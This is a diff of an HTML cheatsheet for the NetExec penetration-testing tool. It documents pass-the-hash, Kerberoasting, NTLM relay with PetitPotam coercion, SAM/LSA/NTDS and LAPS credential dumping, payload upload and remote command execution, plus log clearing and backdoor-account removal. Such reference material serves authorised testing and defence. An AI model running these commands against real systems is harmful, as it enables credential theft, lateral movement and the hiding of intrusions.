-<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.10.10.10<span class="w"> </span>-u<span class="w"> </span>admin<span class="w"> </span>-H<span class="w"> </span>aad3b435b51404eeaad3b435b51404ee:ccb749a1e26e51b6e07ed92d6d68f762<span class="w"> </span>-d<span class="w"> </span>domain<span class="w"> </span>--exec<span class="w"> </span><span class="s1">&#39;hostname&#39;</span>
-</code></pre></div>
-<p><em>Why it works:</em> Uses NTLMv1/v2 authentication to bypass password requirement.</p>
-<hr />
-<h2 id="kerberos-authentication-tgt-based">Kerberos Authentication (TGT-based)<a class="headerlink" href="#kerberos-authentication-tgt-based" title="Permanent link">&para;</a></h2>
-<ol>
-<li>Request TGT with <code>impacket-getTGT</code></li>
-</ol>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>impacket-getTGT<span class="w"> </span>domain/user:password
-</code></pre></div>
-<ol>
-<li>Export ccache:</li>
-</ol>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>/path/to/krb5cc_domain
-</code></pre></div>
-<ol>
-<li>Run NetExec with <code>--kerberos</code></li>
-</ol>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.10.10.10<span class="w"> </span>-k<span class="w"> </span>-d<span class="w"> </span>domain.local<span class="w"> </span>--exec<span class="w"> </span><span class="s1">&#39;whoami&#39;</span>
-</code></pre></div>
-<blockquote>
-<p>Use this for <strong>OPSEC-safe access</strong> when you already have a valid ticket.</p>
-</blockquote>
-<hr />
-<h2 id="ad-enumeration-via-ldap">AD Enumeration via LDAP<a class="headerlink" href="#ad-enumeration-via-ldap" title="Permanent link">&para;</a></h2>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>nxc<span class="w"> </span>ldap<span class="w"> </span><span class="m">10</span>.10.10.10<span class="w"> </span>-u<span class="w"> </span>user<span class="w"> </span>-p<span class="w"> </span>pass<span class="w"> </span>-d<span class="w"> </span>domain.local<span class="w"> </span>--users
-</code></pre></div>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>nxc<span class="w"> </span>ldap<span class="w"> </span><span class="m">10</span>.10.10.10<span class="w"> </span>-u<span class="w"> </span>user<span class="w"> </span>-p<span class="w"> </span>pass<span class="w"> </span>-d<span class="w"> </span>domain.local<span class="w"> </span>--groups
-</code></pre></div>
-<p>Other LDAP options:</p>
-<ul>
-<li>
-<p><code>--computers</code></p>
-</li>
-<li>
-<p><code>--password-policy</code></p>
-</li>
-<li>
-<p><code>--domain-controllers</code></p>
-</li>
-<li>
-<p><code>--loggedon-users</code></p>
-</li>
-</ul>
-<hr />
-<h2 id="modules-you-should-know">Modules You Should Know<a class="headerlink" href="#modules-you-should-know" title="Permanent link">&para;</a></h2>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>nxc<span class="w"> </span>smb<span class="w"> </span>&lt;target&gt;<span class="w"> </span>-u<span class="w"> </span>user<span class="w"> </span>-p<span class="w"> </span>pass<span class="w"> </span>-d<span class="w"> </span>domain<span class="w"> </span>--modules
-</code></pre></div>
-<p>Common useful modules:</p>
-<ul>
-<li>
-<p><code>lsassy</code>: Extracts LSASS credentials via SeDebugPrivilege</p>
-</li>
-<li>
-<p><code>wmi</code>: Executes WMI queries</p>
-</li>
-<li>
-<p><code>psremote</code>: Executes PowerShell scripts remotely</p>
-</li>
-<li>
-<p><code>samdump</code>: Dumps local SAM hashes</p>
-</li>
-<li>
-<p><code>dpapi</code>: Attempts DPAPI blob extraction</p>
-</li>
-<li>
-<p><code>credz</code>: Parses saved credentials</p>
-</li>
-</ul>
-<hr />
-<h2 id="cleanup-post-exploitation-hygiene">Cleanup (Post-Exploitation Hygiene)<a class="headerlink" href="#cleanup-post-exploitation-hygiene" title="Permanent link">&para;</a></h2>
-<p>Remove artifacts like payloads or logs:</p>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.0.0.12<span class="w"> </span>-u<span class="w"> </span>user<span class="w"> </span>-p<span class="w"> </span>pass<span class="w"> </span>--exec<span class="w"> </span><span class="s2">&quot;del C:\Temp\rev.exe&quot;</span>
-</code></pre></div>
-<p>Clear Windows Event Logs if needed (⚠️ noisy, only do if absolutely necessary):</p>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>nxc<span class="w"> </span>winrm<span class="w"> </span><span class="m">10</span>.0.0.12<span class="w"> </span>-u<span class="w"> </span>user<span class="w"> </span>-p<span class="w"> </span>pass<span class="w"> </span>-d<span class="w"> </span>domain<span class="w"> </span>--exec<span class="w"> </span><span class="s1">&#39;wevtutil cl Security&#39;</span>
-</code></pre></div>
-<p>Logoff/Disable the backdoor account if you created one:</p>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.0.0.12<span class="w"> </span>-u<span class="w"> </span>admin<span class="w"> </span>-p<span class="w"> </span>pass<span class="w"> </span>--exec<span class="w"> </span><span class="s1">&#39;net user backdoor /delete&#39;</span>
-</code></pre></div>
-<hr />
-<h2 id="netexec-cheatsheet">NetExec Cheatsheet<a class="headerlink" href="#netexec-cheatsheet" title="Permanent link">&para;</a></h2>
 <table>
 <thead>
 <tr>
-<th>Task</th>
-<th>Command Example</th>
+<th>Option</th>
+<th>Purpose</th>
 </tr>
 </thead>
 <tbody>
 <tr>
-<td>Check credentials (SMB)</td>
-<td><code>nxc smb $IP -u user -p pass</code></td>
+<td><code>--sam</code></td>
+<td>Dump local SAM hashes. Defaults to <code>regdump</code>.</td>
 </tr>
 <tr>
-<td>Enumerate shares</td>
-<td><code>nxc smb $IP -u user -p pass --shares</code></td>
+<td><code>--lsa</code></td>
+<td>Dump LSA secrets. Defaults to <code>regdump</code>.</td>
 </tr>
 <tr>
-<td>List domain users/groups</td>
-<td><code>nxc ldap $IP -u user -p pass --users / --groups</code></td>
+<td><code>--dpapi</code></td>
+<td>Collect DPAPI material.</td>
 </tr>
 <tr>
-<td>PTH authentication</td>
-<td><code>nxc smb $IP -u user -H LM:NT</code></td>
+<td><code>--sccm</code></td>
+<td>Collect SCCM secrets where available.</td>
 </tr>
 <tr>
-<td>Kerberos authentication</td>
-<td><code>nxc smb -k -d domain.local</code></td>
+<td><code>--sam secdump</code></td>
+<td>Use the <code>secdump</code> method for SAM dumping.</td>
 </tr>
 <tr>
-<td>Execute command (SMB)</td>
-<td><code>nxc smb $IP -u admin -p pass --exec 'whoami'</code></td>
+<td><code>--lsa secdump</code></td>
+<td>Use the <code>secdump</code> method for LSA secrets.</td>
 </tr>
 <tr>
-<td>WinRM command execution</td>
-<td><code>nxc winrm $IP -u admin -p pass --exec 'hostname'</code></td>
+<td><code>--ntds</code></td>
+<td>Dump domain NTDS data from a DC.</td>
 </tr>
 <tr>
-<td>Upload file</td>
-<td><code>nxc smb $IP --exec 'put local.exe \\C$\Temp\back.exe'</code></td>
+<td><code>--ntds vss</code></td>
+<td>Use VSS for NTDS dumping.</td>
 </tr>
 <tr>
-<td>Download file</td>
-<td><code>nxc smb $IP --exec 'get \\C$\Temp\loot.txt local.txt'</code></td>
+<td><code>--enabled</code></td>
+<td>Restrict NTDS output to enabled users.</td>
 </tr>
 <tr>
-<td>Pivot with ProxyChains</td>
-<td><code>proxychains nxc smb $IP ...</code></td>
+<td><code>--user &lt;name&gt;</code></td>
+<td>Restrict NTDS output to one account.</td>
 </tr>
 <tr>
-<td>Enumerate AD password policy</td>
-<td><code>nxc ldap $IP -u user -p pass --password-policy</code></td>
+<td><code>--history</code></td>
+<td>Include password history.</td>
 </tr>
 <tr>
-<td></td>
-<td></td>
+<td><code>--kerberos-keys</code></td>
+<td>Include Kerberos keys.</td>
+</tr>
+</tbody>
+</table>
+<h3 id="host-domain-enumeration">Host / Domain Enumeration<a class="headerlink" href="#host-domain-enumeration" title="Permanent link">&para;</a></h3>
+<p>Use the same base shape as access checks:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.10.10.10<span class="w"> </span>-u<span class="w"> </span>alice<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;...&#39;</span><span class="w"> </span>&lt;flag&gt;
+</code></pre></div>
+<table>
+<thead>
+<tr>
+<th>Option</th>
+<th>Purpose</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>--users</code></td>
+<td>Enumerate domain users via SMB/RPC.</td>
+</tr>
+<tr>
+<td><code>--groups</code></td>
+<td>Enumerate domain groups.</td>
+</tr>
+<tr>
+<td><code>--local-groups</code></td>
+<td>Enumerate local groups on the target.</td>
+</tr>
+<tr>
+<td><code>--rid-brute 5000</code></td>
+<td>Brute-force RIDs up to the supplied value.</td>
+</tr>
+<tr>
+<td><code>--loggedon-users</code></td>
+<td>Check locally logged-on users.</td>
+</tr>
+<tr>
+<td><code>--smb-sessions</code></td>
+<td>Enumerate SMB sessions.</td>
+</tr>
+<tr>
+<td><code>--tasklist lsass</code></td>
+<td>Check process list for a named process.</td>
+</tr>
+<tr>
+<td><code>--interfaces</code></td>
+<td>List network interfaces.</td>
+</tr>
+</tbody>
+</table>
+<h3 id="laps">LAPS<a class="headerlink" href="#laps" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.10.10.10<span class="w"> </span>-u<span class="w"> </span>laps-reader<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;...&#39;</span><span class="w"> </span>--laps
+<a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>nxc<span class="w"> </span>ldap<span class="w"> </span>dc01.corp.local<span class="w"> </span>-u<span class="w"> </span>laps-reader<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;...&#39;</span><span class="w"> </span>--query<span class="w"> </span><span class="s1">&#39;(ms-Mcs-AdmPwd=*)&#39;</span><span class="w"> </span><span class="s1">&#39;sAMAccountName ms-Mcs-AdmPwd&#39;</span>
+<a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a>nxc<span class="w"> </span>ldap<span class="w"> </span>dc01.corp.local<span class="w"> </span>-u<span class="w"> </span>laps-reader<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;...&#39;</span><span class="w"> </span>--query<span class="w"> </span><span class="s1">&#39;(msLAPS-Password=*)&#39;</span><span class="w"> </span><span class="s1">&#39;sAMAccountName msLAPS-Password&#39;</span>
+</code></pre></div>
+<table>
+<thead>
+<tr>
+<th>Option</th>
+<th>Purpose</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>--laps</code></td>
+<td>Read LAPS passwords with SMB or WinRM when rights allow it.</td>
+</tr>
+<tr>
+<td><code>--laps &lt;local-admin&gt;</code></td>
+<td>Supply the managed local admin account name.</td>
+</tr>
+<tr>
+<td><code>--query '(ms-Mcs-AdmPwd=*)' ...</code></td>
+<td>Validate legacy Microsoft LAPS read rights over LDAP.</td>
+</tr>
+<tr>
+<td><code>--query '(msLAPS-Password=*)' ...</code></td>
+<td>Validate Windows LAPS read rights over LDAP.</td>
+</tr>
+</tbody>
+</table>
+<h3 id="relay-coercion-prep">Relay / Coercion Prep<a class="headerlink" href="#relay-coercion-prep" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.10.10.0/24<span class="w"> </span>--gen-relay-list<span class="w"> </span>relay-targets.txt
+<a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>ntlmrelayx.py<span class="w"> </span>-tf<span class="w"> </span>relay-targets.txt<span class="w"> </span>-smb2support
+<a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.10.10.10<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span>-M<span class="w"> </span>coerce_plus<span class="w"> </span>-o<span class="w"> </span><span class="nv">LISTENER</span><span class="o">=</span><span class="m">10</span>.10.14.3<span class="w"> </span><span class="nv">METHOD</span><span class="o">=</span>PetitPotam
+</code></pre></div>
+<table>
+<thead>
+<tr>
+<th>Option</th>
+<th>Purpose</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>--gen-relay-list &lt;file&gt;</code></td>
+<td>Write hosts with SMB signing disabled to a relay target file.</td>
+</tr>
+<tr>
+<td><code>-M coerce_plus</code></td>
+<td>Run coercion checks through the module system.</td>
+</tr>
+<tr>
+<td><code>LISTENER=&lt;ip&gt;</code></td>
+<td>Set the listener IP for coercion callbacks.</td>
+</tr>
+<tr>
+<td><code>METHOD=&lt;name&gt;</code></td>
+<td>Pin a coercion method such as <code>PetitPotam</code>.</td>
 </tr>
 </tbody>
 </table>
 <hr />
-<h2 id="recommended-operator-workflow">Recommended Operator Workflow<a class="headerlink" href="#recommended-operator-workflow" title="Permanent link">&para;</a></h2>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>[0] Known creds? Try them!
-<a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a> ↓
-<a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a>[1] Validate credentials (SMB or WinRM)
-<a id="__codelineno-19-4" name="__codelineno-19-4" href="#__codelineno-19-4"></a> ↓
-<a id="__codelineno-19-5" name="__codelineno-19-5" href="#__codelineno-19-5"></a>[2] Enumerate shares → find loot
-<a id="__codelineno-19-6" name="__codelineno-19-6" href="#__codelineno-19-6"></a> ↓
-<a id="__codelineno-19-7" name="__codelineno-19-7" href="#__codelineno-19-7"></a>[3] Enumerate users, groups, computers via LDAP
-<a id="__codelineno-19-8" name="__codelineno-19-8" href="#__codelineno-19-8"></a> ↓
-<a id="__codelineno-19-9" name="__codelineno-19-9" href="#__codelineno-19-9"></a>[4] Identify Admin rights → execute payload or commands
-<a id="__codelineno-19-10" name="__codelineno-19-10" href="#__codelineno-19-10"></a> ↓
-<a id="__codelineno-19-11" name="__codelineno-19-11" href="#__codelineno-19-11"></a>[5] Pivot internally via ProxyChains or socks
-<a id="__codelineno-19-12" name="__codelineno-19-12" href="#__codelineno-19-12"></a> ↓
-<a id="__codelineno-19-13" name="__codelineno-19-13" href="#__codelineno-19-13"></a>[6] Dump creds (lsassy, samdump, dpapi)
-<a id="__codelineno-19-14" name="__codelineno-19-14" href="#__codelineno-19-14"></a> ↓
-<a id="__codelineno-19-15" name="__codelineno-19-15" href="#__codelineno-19-15"></a>[7] Cleanup (remove binaries/logs)
+<h2 id="ldap">LDAP<a class="headerlink" href="#ldap" title="Permanent link">&para;</a></h2>
+<p><code>nxc ldap</code> defaults to LDAP/389. Use <code>--port 636</code> for LDAPS.</p>
+<h3 id="enumeration">Enumeration<a class="headerlink" href="#enumeration" title="Permanent link">&para;</a></h3>
+<p>Use:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>nxc<span class="w"> </span>ldap<span class="w"> </span>dc01.corp.local<span class="w"> </span>-u<span class="w"> </span>alice<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;...&#39;</span><span class="w"> </span>&lt;flag&gt;
 </code></pre></div>
-<blockquote>
-<p><em>Pro Tip:</em> After first access, start a BloodHound collection or dump tokens for delegation/impersonation.</p>
-</blockquote>
+<table>
+<thead>
+<tr>
+<th>Option</th>
+<th>Purpose</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>--users</code></td>
+<td>Enumerate domain users.</td>
+</tr>
+<tr>
+<td><code>--users-export users.txt</code></td>
+<td>Export users to a file.</td>
+</tr>
+<tr>
+<td><code>--groups</code></td>
+<td>Enumerate domain groups.</td>
+</tr>
+<tr>
+<td><code>--groups 'Domain Admins'</code></td>
+<td>Show members of a specific group.</td>
+</tr>
+<tr>
+<td><code>--computers</code></td>
+<td>Enumerate computer objects.</td>
+</tr>
+<tr>
+<td><code>--dc-list</code></td>
+<td>List domain controllers.</td>
+</tr>
+<tr>
+<td><code>--get-sid</code></td>
+<td>Print the domain SID.</td>
+</tr>
+<tr>
+<td><code>--pass-pol</code></td>
+<td>Pull password and lockout policy.</td>
+</tr>
+<tr>
+<td><code>--active-users</code></td>
+<td>Filter for active users.</td>
+</tr>
+<tr>
+<td><code>--pso</code></td>
+<td>Enumerate fine-grained password policies.</td>
+</tr>
+</tbody>
+</table>
+<h3 id="roasting">Roasting<a class="headerlink" href="#roasting" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>nxc<span class="w"> </span>ldap<span class="w"> </span>dc01.corp.local<span class="w"> </span>-u<span class="w"> </span>alice<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;...&#39;</span><span class="w"> </span>--kerberoasting<span class="w"> </span>kerb.hashes
+<a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a>nxc<span class="w"> </span>ldap<span class="w"> </span>dc01.corp.local<span class="w"> </span>-u<span class="w"> </span>alice<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;...&#39;</span><span class="w"> </span>--asreproast<span class="w"> </span>asrep.hashes
+</code></pre></div>
+<table>
+<thead>
+<tr>
+<th>Option</th>
+<th>Purpose</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>--kerberoasting &lt;outfile&gt;</code></td>
+<td>Request roastable TGS hashes and write them to a file.</td>
+</tr>
+<tr>
+<td><code>--asreproast &lt;outfile&gt;</code></td>
+<td>Request AS-REP roastable hashes and write them to a file.</td>
+</tr>
+<tr>
+<td><code>--kerberoast-account &lt;users&gt;</code></td>
+<td>Restrict Kerberoasting to named accounts.</td>
+</tr>
+<tr>
+<td><code>--targeted-kerberoast &lt;user&gt;</code></td>
+<td>Add an SPN to a target account, roast it, then clean up. Requires <code>--kerberoasting &lt;outfile&gt;</code>.</td>
+</tr>
+</tbody>
+</table>
+<h3 id="bloodhound">BloodHound<a class="headerlink" href="#bloodhound" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>nxc<span class="w"> </span>ldap<span class="w"> </span>dc01.corp.local<span class="w"> </span>-u<span class="w"> </span>alice<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;...&#39;</span><span class="w"> </span>--bloodhound<span class="w"> </span>-c<span class="w"> </span>DCOnly<span class="w"> </span>--dns-server<span class="w"> </span><span class="m">10</span>.10.10.10
+</code></pre></div>
+<table>
+<thead>
+<tr>
+<th>Option</th>
+<th>Purpose</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>--bloodhound</code></td>
+<td>Run BloodHound collection.</td>
+</tr>
+<tr>
+<td><code>-c DCOnly</code></td>
+<td>LDAP-only collection; quieter.</td>
+</tr>
+<tr>
+<td><code>-c All</code></td>
+<td>Full collection; fans out into SMB/RPC collection.</td>
+</tr>
+<tr>
+<td><code>--dns-server &lt;ip&gt;</code></td>
+<td>Keep collection DNS aligned with the target domain.</td>
+</tr>
+</tbody>
+</table>
+<h3 id="misconfiguration-hunts">Misconfiguration Hunts<a class="headerlink" href="#misconfiguration-hunts" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>nxc<span class="w"> </span>ldap<span class="w"> </span>dc01.corp.local<span class="w"> </span>-u<span class="w"> </span>alice<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;...&#39;</span><span class="w"> </span>--query<span class="w"> </span><span class="s1">&#39;(&amp;(objectCategory=person)(servicePrincipalName=*))&#39;</span><span class="w"> </span><span class="s1">&#39;sAMAccountName servicePrincipalName&#39;</span>
+</code></pre></div>
+<table>
+<thead>
+<tr>
+<th>Option</th>
+<th>Purpose</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>--trusted-for-delegation</code></td>
+<td>Find unconstrained delegation candidates.</td>
+</tr>
+<tr>
+<td><code>--find-delegation</code></td>
+<td>Enumerate delegation settings.</td>
+</tr>
+<tr>
+<td><code>--password-not-required</code></td>
+<td>Find users with the PASSWD_NOTREQD flag.</td>
+</tr>
+<tr>
+<td><code>--admin-count</code></td>
+<td>Find protected users with <code>adminCount=1</code>.</td>
+</tr>
+<tr>
+<td><code>--gmsa</code></td>
+<td>Enumerate gMSA objects.</td>
+</tr>
+<tr>
+<td><code>--query &lt;filter&gt; &lt;attributes&gt;</code></td>
+<td>Run a custom LDAP query.</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="winrm">WinRM<a class="headerlink" href="#winrm" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>nxc<span class="w"> </span>winrm<span class="w"> </span><span class="m">10</span>.10.10.10<span class="w"> </span>-u<span class="w"> </span>alice<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;...&#39;</span><span class="w"> </span>-d<span class="w"> </span>corp.local
+<a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a>nxc<span class="w"> </span>winrm<span class="w"> </span><span class="m">10</span>.10.10.10<span class="w"> </span>-u<span class="w"> </span>alice<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;...&#39;</span><span class="w"> </span>-x<span class="w"> </span><span class="s1">&#39;whoami /priv&#39;</span>
+<a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a>nxc<span class="w"> </span>winrm<span class="w"> </span><span class="m">10</span>.10.10.10<span class="w"> </span>-u<span class="w"> </span>admin<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;...&#39;</span><span class="w"> </span>--put-file<span class="w"> </span>payload.exe<span class="w"> </span><span class="s1">&#39;C:\\Windows\\Temp\\payload.exe&#39;</span>
+</code></pre></div>
+<table>
+<thead>
+<tr>
+<th>Option</th>
+<th>Purpose</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>--local-auth</code></td>
+<td>Authenticate with a local Windows account.</td>
+</tr>
+<tr>
+<td><code>-x '&lt;cmd&gt;'</code></td>
+<td>Execute through <code>cmd.exe</code>.</td>
+</tr>
+<tr>
+<td><code>-X '&lt;powershell&gt;'</code></td>
+<td>Execute through PowerShell.</td>
+</tr>
+<tr>
+<td><code>--sam</code></td>
+<td>Dump SAM over WinRM.</td>
+</tr>
+<tr>
+<td><code>--lsa</code></td>
+<td>Dump LSA secrets over WinRM.</td>
+</tr>
+<tr>
+<td><code>--dpapi</code></td>
+<td>Collect DPAPI material over WinRM.</td>
+</tr>
+<tr>
+<td><code>--dir &lt;path&gt;</code></td>
+<td>List a remote directory.</td>
+</tr>
+<tr>
+<td><code>--put-file &lt;local&gt; &lt;remote&gt;</code></td>
+<td>Upload a file.</td>
+</tr>
+<tr>
+<td><code>--get-file &lt;remote&gt; &lt;local&gt;</code></td>
+<td>Download a file.</td>
+</tr>
+<tr>
+<td><code>--check-proto http --port 5985</code></td>
+<td>Restrict checks to HTTP WinRM.</td>
+</tr>
+<tr>
+<td><code>--check-proto https --port 5986</code></td>
+<td>Restrict checks to HTTPS WinRM.</td>
+</tr>
+</tbody>
+</table>
+<p>WinRM checks <code>5985</code> and <code>5986</code> by default. Pin protocol and port when only one transport should be probed.</p>
+<hr />
+<h2 id="mssql">MSSQL<a class="headerlink" href="#mssql" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>nxc<span class="w"> </span>mssql<span class="w"> </span><span class="m">10</span>.10.10.10<span class="w"> </span>-u<span class="w"> </span>sa<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;...&#39;</span><span class="w"> </span>--local-auth
+<a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a>nxc<span class="w"> </span>mssql<span class="w"> </span><span class="m">10</span>.10.10.10<span class="w"> </span>-u<span class="w"> </span>alice<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;...&#39;</span><span class="w"> </span>-d<span class="w"> </span>corp.local<span class="w"> </span>-q<span class="w"> </span><span class="s1">&#39;SELECT @@version&#39;</span>
+<a id="__codelineno-20-3" name="__codelineno-20-3" href="#__codelineno-20-3"></a>nxc<span class="w"> </span>mssql<span class="w"> </span><span class="m">10</span>.10.10.10<span class="w"> </span>-u<span class="w"> </span>sa<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;...&#39;</span><span class="w"> </span>--local-auth<span class="w"> </span>-x<span class="w"> </span><span class="s1">&#39;whoami&#39;</span>
+</code></pre></div>
+<table>
+<thead>
+<tr>
+<th>Option</th>
+<th>Purpose</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>--local-auth</code></td>
+<td>Use SQL auth instead of Windows domain auth.</td>
+</tr>
+<tr>
+<td><code>-d &lt;domain&gt;</code></td>
+<td>Use Windows domain auth to SQL Server.</td>
+</tr>
+<tr>
+<td><code>-q '&lt;query&gt;'</code></td>
+<td>Run a SQL query.</td>
+</tr>
+<tr>
+<td><code>--database</code></td>
+<td>List databases.</td>
+</tr>
+<tr>
+<td><code>--database &lt;name&gt;</code></td>
+<td>Select a database.</td>
+</tr>
+<tr>
+<td><code>--rid-brute 5000</code></td>
+<td>RID brute-force through MSSQL.</td>
+</tr>
+<tr>
+<td><code>-x '&lt;cmd&gt;'</code></td>
+<td>Run <code>xp_cmdshell</code> command execution.</td>
+</tr>
+<tr>
+<td><code>-X '&lt;powershell&gt;'</code></td>
+<td>Run PowerShell through <code>xp_cmdshell</code>.</td>
+</tr>
+<tr>
+<td><code>--put-file &lt;local&gt; &lt;remote&gt;</code></td>
+<td>Upload a file through MSSQL.</td>
+</tr>
+<tr>
+<td><code>--get-file &lt;remote&gt; &lt;local&gt;</code></td>
+<td>Download a file through MSSQL.</td>
+</tr>
+<tr>
+<td><code>-M mssql_priv</code></td>
+<td>Check privilege escalation paths.</td>
+</tr>
+<tr>
+<td><code>-M enum_links</code></td>
+<td>Enumerate linked servers.</td>
+</tr>
+<tr>
+<td><code>-M enum_impersonate</code></td>
+<td>Enumerate impersonation rights.</td>
+</tr>
+<tr>
+<td><code>-M mssql_coerce</code></td>
+<td>Trigger MSSQL coercion paths.</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="other-protocols">Other Protocols<a class="headerlink" href="#other-protocols" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>nxc<span class="w"> </span>ssh<span class="w"> </span><span class="m">10</span>.10.10.10<span class="w"> </span>-u<span class="w"> </span>root<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;toor&#39;</span><span class="w"> </span>-x<span class="w"> </span><span class="s1">&#39;id&#39;</span>
+<a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a>nxc<span class="w"> </span>rdp<span class="w"> </span><span class="m">10</span>.10.10.10<span class="w"> </span>-u<span class="w"> </span>alice<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;...&#39;</span><span class="w"> </span>--screenshot
+<a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a>nxc<span class="w"> </span>nfs<span class="w"> </span><span class="m">10</span>.10.10.10<span class="w"> </span>--shares
+</code></pre></div>
+<table>
+<thead>
+<tr>
+<th>Protocol</th>
+<th>Options</th>
+<th>Purpose</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>ssh</code></td>
+<td><code>-x '&lt;cmd&gt;'</code></td>
+<td>Execute a remote command.</td>
+</tr>
+<tr>
+<td><code>ssh</code></td>
+<td><code>--key-file ./id_rsa -p '&lt;passphrase&gt;'</code></td>
+<td>Authenticate with a private key and passphrase.</td>
+</tr>
+<tr>
+<td><code>ssh</code></td>
+<td><code>--sudo-check</code></td>
+<td>Check sudo rights.</td>
+</tr>
+<tr>
+<td><code>ssh</code></td>
+<td><code>--put-file &lt;local&gt; &lt;remote&gt;</code> / <code>--get-file &lt;remote&gt; &lt;local&gt;</code></td>
+<td>Transfer files.</td>
+</tr>
+<tr>
+<td><code>rdp</code></td>
+<td><code>--screenshot</code></td>
+<td>Capture an authenticated RDP screenshot.</td>
+</tr>
+<tr>
